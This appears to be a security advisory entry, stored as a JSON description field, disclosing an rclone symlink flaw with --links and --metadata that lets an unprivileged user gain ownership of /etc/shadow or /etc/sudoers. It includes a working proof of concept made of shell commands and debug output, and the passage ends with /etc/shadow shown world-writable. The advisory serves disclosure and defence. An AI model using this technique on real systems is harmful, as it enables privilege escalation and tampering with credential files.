    "Description": "### **tl;dr:**\n\nunprivileged user creates a symlink to /etc/sudoers, /etc/shadow or similar and waits for a privileged user or process to copy/backup/mirror users data (using `--links` and `--metadata`). unprivileged user now owns /etc/sudoers.\n\n### Summary\n\nInsecure handling of symlinks with `--links` and `--metadata` in rclone while copying to local disk allows unprivileged users to indirectly modify ownership and permissions on symlink target files when a superuser or privileged process performs a copy. This vulnerability could enable privilege escalation and unauthorized access to critical system files (e.g., /etc/shadow), compromising system integrity, confidentiality, and availability.\n\nFor instance, an unprivileged user could set a symlink to a sensitive file within their home directory, waiting for an administrator or automated process (e.g., a cron job running with elevated privileges) to copy their files with rclone using the --links and --metadata options. Upon copying, rclone will incorrectly apply chown and chmod to the symlinkâ€™s target file rather than just the symlink itself, resulting in ownership and permission changes on the sensitive file.\n\n### Who is affected\n\nIf you are not using `--metadata` **and** `--links` **and** copying files **to** the local backend you are not affected by this issue.\n\nIf you are using `--metadata` and `-links` and copying files to the local backend but not as a superuser, then this will manifest itself as a bug by setting incorrect permissions.\n\nIf you are using `--metadata` and `-links` and copying files to the local backend but as a superuser then this could affect you.\n\n### Details\n\nWhen copying directories containing symlinks with rclone using the --links and --metadata options, rclone mistakenly applies chown and chmod operations to the target of the symlink instead of the symlink itself. As a result, ownership and permissions on sensitive system files (e.g., /etc/shadow) may be altered if they are the target of any symlink within the copied directory structure. This allows users to affect the permissions and ownership of files they should not have access to, resulting in privilege escalation and potential system compromise.\n\n### PoC\n\n```\n# Create a directory to simulate a user home directory\nroot@workstation:~# mkdir -p /tmp/home/user1\nroot@workstation:~# sudo chown user1:user1 /tmp/home/user1\n```\n```\n# As user1, create a symlink to /etc/shadow within their home directory\nroot@workstation:~# sudo -u user1 ln -s /etc/shadow /tmp/home/user1/shadow_link\n```\n```\n# List permissions on the original files\nroot@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow\n----------. 1 root  root  1283 Nov  5 13:30 /etc/shadow\nlrwxrwxrwx. 1 user1 user1   11 Nov  5 13:56 /tmp/home/user1/shadow_link -\u003e /etc/shadow\n```\n```\n# Copy the directory structure with rclone\nroot@workstation:~# rclone copy /tmp/home /tmp/home_new --links --metadata --log-level=DEBUG\n2024/11/05 13:56:53 DEBUG : rclone: Version \"v1.68.1\" starting with parameters [\"rclone\" \"copy\" \"/tmp/home\" \"/tmp/home_new\" \"--links\" \"--metadata\" \"--log-level=DEBUG\"]\n2024/11/05 13:56:53 DEBUG : Creating backend with remote \"/tmp/home\"\n2024/11/05 13:56:53 NOTICE: Config file \"/root/.config/rclone/rclone.conf\" not found - using defaults\n2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding \"{b6816}\" suffix to name\n2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item \"/tmp/home\" to be canonical \"local{b6816}:/tmp/home\"\n2024/11/05 13:56:53 DEBUG : Creating backend with remote \"/tmp/home_new\"\n2024/11/05 13:56:53 DEBUG : local: detected overridden config - adding \"{b6816}\" suffix to name\n2024/11/05 13:56:53 DEBUG : fs cache: renaming cache item \"/tmp/home_new\" to be canonical \"local{b6816}:/tmp/home_new\"\n2024/11/05 13:56:53 DEBUG : Added delayed dir = \"user1\", newDst=\u003cnil\u003e\n2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: Need to transfer - File not found at Destination\n2024/11/05 13:56:53 DEBUG : user1/shadow_link.rclonelink: md5 = 2fe8599cb25a0c790213d39b3be97c27 OK\n2024/11/05 13:56:53 INFO  : user1/shadow_link.rclonelink: Copied (new)\n2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for checks to finish\n2024/11/05 13:56:53 DEBUG : Local file system at /tmp/home_new: Waiting for transfers to finish\n2024/11/05 13:56:53 INFO  : user1: Updated directory metadata\n2024/11/05 13:56:53 INFO  :\nTransferred:             11 B / 11 B, 100%, 0 B/s, ETA -\nTransferred:            1 / 1, 100%\nElapsed time:         0.0s\n\n2024/11/05 13:56:53 DEBUG : 6 go routines active\n```\n```\n# List permissions again\nroot@workstation:~# ls -l /tmp/home/user1/shadow_link /etc/shadow /tmp/home_new/user1/shadow_link\n-rwxrwxrwx. 1 user1 user1 1283 Nov  5 13:30 /etc/shadow                                                 # Wrong, very wrong.
